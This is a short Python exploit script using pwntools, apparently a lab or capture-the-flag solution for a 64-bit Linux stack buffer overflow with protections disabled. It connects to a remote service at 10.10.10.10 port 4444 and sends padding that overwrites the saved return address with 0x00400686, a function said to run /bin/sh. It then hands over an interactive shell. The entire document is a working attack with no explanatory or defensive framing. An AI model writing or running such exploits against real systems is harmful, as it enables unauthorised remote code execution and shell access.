#!/usr/bin/env python3
# Exploit by Mardcore
# Linux Buffer Overflow 64 bits All disabled

from pwn import *

context(os='linux', arch='amd64')

p = remote("10.10.10.10", 4444)

buffer = ("A"*32).encode()
rbp = ("B"*8).encode()

# 0x00400686 vuln. Jump to a vulnerable function that executes /bin/sh
rip = p64(0x00400686)

p.recvuntil(b"What's your name: ")
p.sendline(buffer + rbp  + rip)
p.interactive()
